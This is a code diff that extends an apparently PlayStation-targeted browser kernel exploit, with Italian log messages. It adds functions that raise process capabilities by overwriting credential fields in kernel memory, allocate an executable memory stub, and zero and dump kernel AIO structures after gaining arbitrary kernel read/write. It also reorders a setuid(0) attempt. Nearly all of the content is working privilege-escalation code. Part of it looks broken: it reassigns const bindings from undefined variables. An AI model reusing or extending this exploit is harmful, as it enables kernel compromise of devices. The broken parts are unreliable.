@@ -42,6 +42,82 @@ import * as config from './config.mjs';
 
 const t1 = performance.now();
 
+
+let chain, kmem, reqs1_addr, p_ucred;
+let pktopts_sds, dirty_sd;
+let kbase, kernel_addr, restore_info;
+let sds = []
+
+
+
+function allocate_jit_stub() {
+  const PROT_READ = 1, PROT_WRITE = 2, PROT_EXEC = 4;
+  const MAP_ANON = 0x1000, MAP_PRIVATE = 0x2;
+
+  const stub_addr = chain.sysp(
+    'mmap',
+    new Int(0x10000, 0),       
+    0x1000,                     
+    PROT_READ | PROT_WRITE | PROT_EXEC,
+    MAP_ANON | MAP_PRIVATE,
+    -1,
+    0
+  );
+
+  if (stub_addr.eq(0)) {
+    die("❌ JIT stub allocation fallita (mmap ha restituito 0)");
+  }
+ const code = new Uint8Array([0xFF, 0xE7, 0x90, 0x90]);
+  const stub_view = array_from_address(stub_addr, code.length);
+  stub_view.set(code);
+
+  log(`✅ JIT stub scritto a 0x${stub_addr.toString(16)}`);
+  return stub_addr;
+}
+
+function zero_out_aio(kmem, addr) {
+  try {
+    const zero = new Buffer(0x80);
+    zero.fill(0);
+    kmem.copyin(zero.addr, addr, zero.size);
+    log(`✅ AIO @ 0x${addr.toString(16)} azzerato`);
+  } catch (e) {
+    log(`❌ Errore durante zero_out_aio: ${e}`);
+  }
+}
+
+function debug_aio_memory_state(kmem, addr, label = "AIO") {
+  log(`--- ${label} memory dump @ 0x${addr.toString(16)} ---`);
+  try {
+    const buf = new Buffer(0x80);
+    kmem.copyout(addr, buf.addr, buf.size);
+
+    for (let i = 0; i < buf.size; i += 16) {
+      let line = addr.add(i).toString(16).padStart(8, '0') + ': ';
+      let hexPart = '', asciiPart = '';
+      for (let j = 0; j < 16 && (i + j) < buf.size; j++) {
+        const b = buf[i + j];
+        hexPart += b.toString(16).padStart(2, '0') + ' ';
+        asciiPart += (b >= 0x20 && b < 0x7f) ? String.fromCharCode(b) : '.';
+      }
+      line += hexPart.padEnd(48) + asciiPart;
+      log(line);
+    }
+  } catch (e) {
+    log(`❌ Errore during AIO dump: ${e}`);
+  }
+}
+
+function apply_jit_caps(kmem, p_ucred) {
+  try {
+    kmem.write64(p_ucred.add(0x60), -1); // cr_sceCaps[0]
+    kmem.write64(p_ucred.add(0x68), -1); // cr_sceCaps[1]
+    log("✅ Privilegi JIT applicati");
+  } catch (e) {
+    log(`⚠️ Errore applicando JIT caps: ${e}`);
+  }
+}
+
 // check if we are running on a supported firmware version
 const [is_ps4, version] = (() => {
     const value = config.target;
@@ -1697,17 +1773,18 @@ export async function kexploit() {
     await init();
     const _init_t2 = performance.now();
 
-     try {
-        chain.sys('setuid', 0);
-        }
-    catch (e) {
-        localStorage.ExploitLoaded = "no";
-    }
-    
-     if (localStorage.ExploitLoaded === "yes" && sessionStorage.ExploitLoaded!="yes") {
+   if (localStorage.ExploitLoaded === "yes" && sessionStorage.ExploitLoaded!="yes") {
            runBinLoader();
             return new Promise(() => {});
       }
+
+     try {
+        chain.sys('setuid', 0);
+        }
+    
+    catch (e) {
+        localStorage.ExploitLoaded = "no";
+    }
  
     // fun fact:
     // if the first thing you do since boot is run the web browser, WebKit can
@@ -1759,7 +1836,31 @@ export async function kexploit() {
         log('\nSTAGE: Get arbitrary kernel read/write');
         const [kbase, kmem, p_ucred, restore_info] = make_kernel_arw(
             pktopts_sds, dirty_sd, reqs1_addr, kernel_addr, sds);
+        
+            log('__________________TEST________________________');
+      kbase = kbase_val;
+      kmem = kmem_val;
+      p_ucred = p_ucred_val;
+     restore_info = restore_info_val;
 
+   
+  debug_aio_memory_state(kmem, reqs1_addr, "AIO – prima della pulizia");
+
+
+        apply_jit_caps(kmem, p_ucred);
+
+ 
+      const stub_addr = allocate_jit_stub();
+
+            zero_out_aio(kmem, reqs1_addr);
+
+         debug_aio_memory_state(kmem, reqs1_addr, "AIO – dopo la pulizia");
+        
+            log('__________________TEST________________________');
+
+
+
+        
         log('\nSTAGE: Patch kernel');
         await patch_kernel(kbase, kmem, p_ucred, restore_info);
         
